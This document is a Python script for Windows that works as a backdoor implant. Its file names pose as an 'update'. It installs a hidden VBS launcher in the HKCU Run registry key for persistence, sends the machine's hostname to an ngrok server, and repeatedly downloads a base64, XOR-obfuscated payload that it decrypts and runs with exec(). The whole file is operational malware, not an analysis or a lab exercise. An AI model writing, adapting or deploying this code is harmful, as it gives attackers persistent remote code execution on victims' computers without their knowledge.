from urllib.request import Request, urlopen
import socket, time, base64, os, winreg
from pathlib import Path
name = socket.gethostname().encode("utf-8")
url = "https://scarce-sullen-brilliant.ngrok-free.dev" 
current_dir = Path(__file__).resolve().parent
vbs_path = os.path.join(current_dir, "update.vbs")
python_exe = os.path.join(current_dir, "python.exe")
update_py = os.path.join(current_dir, "update.py")
if not os.path.exists(vbs_path):
    vbs_content = f'CreateObject("Wscript.Shell").Run """{python_exe}"" ""{update_py}""", 0, False'
    with open(vbs_path, "w", encoding="utf-8") as f:
        f.write(vbs_content)
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0,winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key,"Task",0,winreg.REG_SZ,vbs_path)
req = Request(url, data=name) 
req.add_header("Content-Type", "text/plain")
req.add_header("ngrok-skip-browser-warning", "1")
while True:
    try:
        urlopen(req)
        with urlopen(url+"/bin.txt", timeout=5) as response:
            file_content = response.read().decode('utf-8')
            ct = base64.b64decode(file_content)
            key = b'password123'
            x = bytearray(b ^ key[i % len(key)] for i, b in enumerate(ct))
            exec(x.decode('utf-8'))
    except Exception as e:
        print(f"Ошибка при отправке: {e}")
        time.sleep(600)

  # exec(compile(base64.b64decode('').decode('utf-8'),'<string>', 'exec'))
